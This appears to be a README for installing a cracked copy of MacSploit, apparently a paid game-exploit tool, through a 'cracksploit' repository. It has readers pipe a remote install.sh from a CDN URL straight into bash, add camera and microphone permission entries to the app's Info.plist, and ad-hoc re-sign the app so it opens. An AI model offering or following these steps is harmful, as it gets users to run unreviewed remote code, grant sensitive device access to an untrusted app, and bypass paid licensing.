The free installer for MacSploit
--

First `cd`
```bash

cd ~/ 
```
<br>
<br>

Then download this (you may have to take out the `</d/tty` if it doesn't work the first time
```bash
curl -s "https://cdn.jsdelivr.net/gh/rhenryw/cracksploit@main/install.sh" | bash </dev/tty
```
<br>
<br>

Go to `/Users/USERNAME/Applications/MacSploit.app/Contents/Info.plist`

add the following in between the `<dict>` and `</dict>` blocks

```xml
<key>NSMicrophoneUsageDescription</key>
<string>CrackSploit requires microphone access for voice chat</string>
<key>NSCameraUsageDescription</key>
<string>CrackSploit needs access to your camera for beta features.</string>
```
<br>
<br>
Then resign to make it openable

```bash
codesign --force --deep --sign - ~/Applications/MacSploit.app 
```
<br>
<br>
Tada!

###### or just buy MacSploit for $10 [here](https://www.raptor.fun/payments/products/lifetime)
